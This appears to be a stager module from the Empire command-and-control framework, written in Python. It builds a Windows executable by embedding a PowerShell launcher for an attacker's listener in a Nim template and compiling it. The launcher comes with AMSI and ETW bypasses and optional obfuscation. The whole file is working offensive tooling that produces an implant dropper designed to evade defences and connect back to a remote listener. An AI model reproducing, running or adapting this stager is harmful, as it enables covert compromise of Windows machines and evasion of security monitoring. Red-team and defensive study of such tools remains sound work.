from __future__ import print_function

import os
from builtins import object

from empire.server.common import helpers


class Stager(object):
    def __init__(self, main_menu, params=[]):

        self.info = {
            "Name": "Nim Powershell Launcher",
            "Author": ["@hubbl3"],
            "Description": "Generate an unmanaged binary that loads the CLR and executes a powershell one liner",
            "Comments": ["Based on the work of @bytebl33d3r"],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell"],
                "Strict": True,
            },
            "Listener": {
                "Description": "Listener to use.",
                "Required": True,
                "Value": "",
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": "Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "OutFile": {
                "Description": "Name to save File as.",
                "Required": False,
                "Value": "Launcher.exe",
            },
            "Obfuscate": {
                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "mattifestation etw",
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.main_menu = main_menu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]["Value"] = value

    def generate(self):

        # staging options
        language = self.options["Language"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]

        if language.lower() == "powershell":
            obfuscate = self.options["Obfuscate"]["Value"]
            obfuscate_command = self.options["ObfuscateCommand"]["Value"]
            outfile = self.options["OutFile"]["Value"]

            if not self.main_menu.listeners.is_listener_valid(listener_name):
                # not a valid listener, return nothing for the script
                print(helpers.color("[!] Invalid listener: " + listener_name))
                return ""
            else:
                obfuscate_script = False
                if obfuscate.lower() == "true":
                    obfuscate_script = True

                if obfuscate_script and "launcher" in obfuscate_command.lower():
                    print(
                        helpers.color(
                            "[!] if using obfuscation, LAUNCHER obfuscation cannot be used in the dll stager."
                        )
                    )
                    return ""

            launcher = self.main_menu.stagers.generate_launcher(
                listener_name,
                language=language,
                encode=False,
                userAgent=user_agent,
                proxy=proxy,
                proxyCreds=proxy_creds,
                stagerRetries=stager_retries,
                bypasses=self.options["Bypasses"]["Value"],
            )

            if launcher == "":
                print(helpers.color("[!] Error in launcher command generation."))
                return ""

            else:
                # Generate nim launcher from template
                nim_source = open(
                    self.main_menu.installPath
                    + "/data/module_source/nim/execute_powershell_bin.nim",
                    "rb",
                ).read()
                nim_source = nim_source.decode("UTF-8")
                nim_source = nim_source.replace("{{ script }}", launcher)
                file = open("/tmp/launcher.nim", "w")
                file.write(nim_source)
                file.close()
                currdir = os.getcwd()
                os.chdir("/tmp/")
                os.system("nim c -d=mingw --app=gui --cpu=amd64 -d:danger -d:strip --opt:size launcher.nim")
                os.chdir(currdir)
                os.remove("/tmp/launcher.nim")

                # Create exe and send to client
                directory = "/tmp/launcher.exe"
                f = open(directory, "rb")
                code = f.read()
                f.close()
                return code

        else:
            print(helpers.color("[!] Invalid launcher language."))
            return ""
